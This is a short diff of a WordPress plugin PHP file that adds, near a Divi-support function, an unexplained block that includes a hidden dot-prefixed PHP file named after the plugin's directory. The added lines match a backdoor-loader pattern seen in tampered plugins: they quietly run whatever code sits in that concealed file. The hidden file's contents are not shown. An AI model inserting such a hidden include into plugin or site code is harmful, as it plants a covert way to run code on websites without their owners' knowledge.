@@ -239,7 +239,11 @@ if (!defined('ABSPATH')) {
  *
  * @since 1.1.0
  * @return void
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wu_admin_pages_add_divi_support() {
 
   if ( class_exists('ET_Builder_Plugin') ) {
